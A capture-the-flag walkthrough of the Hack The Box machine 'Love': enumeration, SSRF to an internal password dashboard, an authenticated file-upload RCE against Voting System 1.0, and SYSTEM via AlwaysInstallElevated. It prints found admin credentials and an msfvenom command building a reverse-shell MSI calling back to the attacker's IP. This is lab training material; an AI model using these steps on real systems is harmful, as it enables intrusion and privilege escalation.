1, port scan and subdomain enumerate
```
80/tcp http http-title: Voting System using PHP
443/tcp ssl/http
445/tcp SMB
3306/tcp mysql
5000/tcp http
7680/tcp pando-pub

staging.love.htb
```

2, enumerate the web page and services.
(*1*) , check the http service port 80 
```
There is a **Voting System** Login Page.
We didnot have any credits, but we can try some default creds.
Very sad, there is no useful defaults.
So let's check other services.

But we can search some exploits about the version of Voting System using PHP.

So crazy, there are so many search result and most of them are high-level danger. :)

Thus, I would choose a rce vulner:
Voting System 1.0 - Remote Code Execution (Unauthenticated)
http://love.htb/admin
```

(*2*), check the http service port 443, 5000
`Get the request code 403 Forbidden.

(*3*), check the SMB service port 445
```
smbclient -L 10.10.10.239

Password for [WORKGROUP\wither]:
session setup failed: NT_STATUS_ACCESS_DENIED

It need the auth!
```

(*4*), check the mysql service port 3306
```
mysql -h 10.10.10.239

ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.65' is not allowed to connect to this MariaDB server
```

(*5*), check the subdomain 'staging.love.htb'
```
There is a file scan service and we need to input our file url.
Let's try and see what can we get.

It worked, so that means we can use it to check the port 5000 or 443 to find something we are forbiddened.

Then we can find 5000 port has a service of Password Dashboard.
Thus we get a password: 
**Vote Admin Creds admin: @LoveIsInTheAir!!!!**
```

\3, get the user shell.
Like before, we have known the user admin's credit and we know the admin login page. So let's just login it and check it.

Let's come to exploit database and check some useful poc for us.
`Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)`
It looks very prefect for us and we can bind it to our shell.
After making appropriate modifications, we can get user shell.

4, shell as SYSTEM
```
Enumeration 
After looking around the filesystem a bit manually, I opted to run WinPEAS. After cloning the repo to my VM, I went into the directory with winPEAS.exe and started a Python web server (python3 -m http.server 80).
```
By check the history file ,we get 
`curl 10.10.14.9:8000/dControl.zip -o dControl.zip`

```
Being able to create directories at the C:\ root is interesting.

  [+] Drives Information
   [?] Remember that you should search more info inside the other drives
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 3 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])  
```

```
AlwaysInstallElevated is set to 1:

  [+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated                                             
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU! 
```
These registry keys tell windows that a user of any privilege can install .msi files are NT AUTHORITY\SYSTEM. So all I need to do is create a malicious .msi file, and run it.
这些注册表项告诉 Windows 任何权限的用户都可以安装 NT AUTHORITY\SYSTEM 下的.msi文件。所以我需要做的就是创建一个恶意.msi文件并运行它。

So, we can use msfvenom to make a payload.
`msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.65 LPORT=4444 -f msi -o rev.msi`

Then just upload it to the machine and exec it .Then we can get the SYSTEM shell.




